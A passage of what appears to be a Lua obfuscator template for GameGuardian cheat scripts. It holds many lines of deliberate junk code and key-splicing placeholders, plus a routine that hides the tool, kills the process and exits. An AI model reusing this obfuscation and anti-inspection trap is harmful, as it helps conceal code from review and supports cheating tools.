 while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;local w={102,88,4,56,73}if(w.w)then;w.w=(w.w(w))end;end
while(nil)do;for w=w,w do;local w={102,88,4,56,73}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={102,88,4,56,73}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={102,88,4,56,73}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={102,88,4,56,73}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={102,88,4,56,73}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={102,88,4,56,73}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={102,88,4,56,73}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={102,88,4,56,73}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
for i = 1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {15,3,100,23,98} _ = _() _ = -nil  _  = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _~= nil then   _ = _ (-nil * nil)()  _ = nil end  if _  == nil then  _ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil} end end local j = {15,3,100,23,98} j[''] = j local t = (j)(j, j) t[1] = 1 end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while (nil)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end

while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
local ABBB = "]]..Key1..[[";local ACC = "]]..Key2..[[";
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..Block..[[
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
local ADD = "]]..Key3..[[";
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..tempstr(5)..[[
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end
for i = 1, 0 do;Batman = 'Batman';end;for i = 1, 0 do;if(nil)then;Batman = 'Batman';end;end
]]..Block..[[
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local a={} local b={} local c={}if (a.a) then if (a.a.a) then if (a.a.a.a) then if (a.a.a.a.a) then if (b.b) then if (b.b.b) then if (b.b.b.b) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;a.a = (a.a(a)) a.a=(a.a(a.a.a(a.a(a)))) b.b = (b.b(b)) b.b=(b.b(b.b.b(b.b.b.b(b.b.b(b.b(b.b)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {a.a,b.b,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local z={} local x={} local c={}if (z.z) then if (z.z.z) then if (z.z.z.z) then if (z.z.z.z.z) then if (x.x) then if (x.x.x) then if (x.x.x.x) then if (c.c) then if (c.c.c) then if (c.c.c.c) then;z.z = (z.z(z)) z.z=(z.z(z.z.z(z.z(z)))) x.x = (x.x(x)) x.x=(x.x(x.x.x(x.x.x.x(x.x.x(x.x(x.x)))))) c.c = (c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) local r = {z.z,x.x,c.c} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local f={} local g={} local h={}if (f.f) then if (f.f.f) then if (f.f.f.f) then if (f.f.f.f.f) then if (g.g) then if (g.g.g) then if (g.g.g.g) then if (h.h) then if (h.h.h) then if (h.h.h.h) then;f.f = (f.f(f)) f.f=(f.f(f.f.f(f.f(f)))) g.g = (g.g(g)) g.g=(g.g(g.g.g(g.g.g.g(g.g.g(g.g(g.g)))))) h.h = (h.h(h.h.h(h.h.h.h(h.h.h(h.h(h.h)))))) local r = {f.f,g.g,h.h} r.r = r[1]..r[2]..r[3] r.i = r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local x={}if (x.x)then if (x.x.x)then;x.x=(x.x(x)) x.x=(x.x(x.x.x(x.x(x))))end;end;end
while (nil)do;local o={}if (o.o(o(o.o(o.oo))))then if (o.oo) then oo={} if (oo.o(oo.oo))then;o.o=(o.o(o.o.o(o.oo(oo.o(oo.oo(o.o.o(o.o(o,o)))))))) o={o.o,o.o,o.o,oo.o,oo.oo} p = (nil),(nil)*(nil) o.p = p,p,p,p oo.oo.o = (nil),(nil)..","..o.p..","..(nil)*(nil)/(nil)..",(nil)" _G = {oo.oo.o,_G,oo.oo.o} gg = {oo.oo.o,gg,oo.oo.o} end;end;end;end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
					while (nil)do;local a={}if (a.a)then if (a.a.a)then if (a.a.a.a) then if(a.a.a.a.a)then if (a.a.a.a.a.a) then;a.a=(a.a(a)) a.a=(a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))) a.b = (a.a(a.a.a(a.a.a.a(a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))),(a.a(a.a.a(a.a.a.a(a.a.a.a.a((a.a.a.a.a.a(a.a.a.a(a.a.a(a.a(a)))))))))) end;end;end;end;end;end
					while nil ~=nil do;local c = {} c.c = nil,nil,nil,nil if (c.c)then;c.c=(c.c(c)) c.c=(c.c(c))end;end
				while not (nil) do gg.setVisible(false)   while true do     gg.setVisible(false)     gg.processKill()     gg.setVisible(true)     os.exit()   end   return end end
			while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
		while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
	while (nil)do;local o={} local p={} local q={}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
		for x = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) _L = _L(_Lnil_Lnil)(_L) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _L  ~= nil then _L = _ (_Lnil*nil*nil*-nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
			while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
				while (nil) do;local T={}   if (T.T)then if (T.T.T)then;T.T=(T.T(T)) T.T = (T.T(T.T.T(T.T(T)))) end;end
